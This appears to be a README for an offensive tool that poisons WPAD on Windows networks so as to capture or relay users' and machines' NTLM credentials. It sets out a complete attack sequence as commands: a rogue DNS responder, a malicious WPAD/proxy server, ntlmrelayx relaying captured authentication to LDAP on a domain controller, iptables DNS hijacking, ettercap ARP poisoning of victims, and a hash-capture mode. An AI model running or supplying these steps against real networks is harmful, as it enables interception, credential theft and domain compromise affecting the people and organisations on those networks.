# wpad light poisoner
Poison WPAD of Windows hosts to trigger uesr &amp; machine NTLM auths over HTTP without breaking everything.

Classic WPad poisoning blocks all HTTP(S) connections. The goal of these scripts is to capture NTLM user and machine credentials over HTTP by poisoning only “non-critical” domains that are frequently accessed:
- msftconnecttest.com
- windowsupdate.com
- msn.com
- data.microsoft.com
- smartscreen.microsoft.com


> [!CAUTION]
> ARP cache poisoning + DNS hijacking + WPAD poisoning will probably break things. Start with a few hosts and do not poison servers.


## Use (relay to LDAP/LDAPS)
Start DNS server (proxies every query to real DNS and only answer attacker IP for wpad, mitm6 can also be used).
```
python3 dns_wpad_mitm.py --upstream <REAL DC/DNS IP> --answer-ip <ATTACKER IP>
```
Start WPAD & Proxy server (serves custom wpad.dat file, redirect connection to itself to limit to 1 auth / user and then send auth to dst_ip:dst_port)
```
sudo ./venv/bin/python3 wpad_server.py --dst-ip <ATTACKER IP> --dst-port 8080 --listen-host <ATTACKER IP>
```
Start ntlmrelayx to LDAP/LDAPS (when signature or chanel binding is not required)
```
ntlmrelayx -t ldap(s)://<DC_IP> --interactive --http-port 8080 -dh --keep-relaying -ts
```
Hijack DNS
```
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination <ATTACKER IP>:5454
```
ARP cache poisoning
```
sudo ettercap -i <INTERFACE> -P autoadd -T -q -M arp:remote /victims// /gateway ip//
```
Enjoy!
## Use (capture hashes)
When LDAP signing is required and chanel binding is set to "always" it is possible to only capture hashes.
```
python3 proxy_responder.py
```
